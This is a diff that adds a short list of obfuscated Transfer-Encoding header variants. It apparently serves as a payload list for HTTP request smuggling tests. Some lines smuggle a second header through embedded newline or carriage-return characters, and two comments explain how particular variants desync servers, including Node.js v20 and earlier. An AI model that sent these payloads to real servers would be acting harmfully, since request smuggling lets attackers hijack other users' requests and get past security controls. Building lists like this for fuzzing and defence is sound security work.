@@ -1,0 +1,20 @@
+"transfer-encoding":"xchunked"
+"transfer-encoding ":" chunked"
+
+//normal
+"transfer-encoding":"chunked" 
+"transfer-encoding":"x"
+"transfer-encoding":"\tchunked"
+
+" transfer-encoding":"chunked"
+"x":"x\ntransfer-encoding: chunked"
+"transfer-encoding\r\n"
+ ": chunked"
+
+** "transfer-encoding":"chunked, chunked" 	    //only put this header remove all CL headers causes server to assume CL of 0 and thus desyncs
+
+** "X-Abc":"\rxtransfer-encoding: chunked"  //note the '\r' prefacing the 'smuggled' te header - considered a newline by Node.js v20 and prior
+
+"transfer-encoding:" chunked"
+"transfer-encoding":" chunked "
+"transfer-encoding ":"chunked"
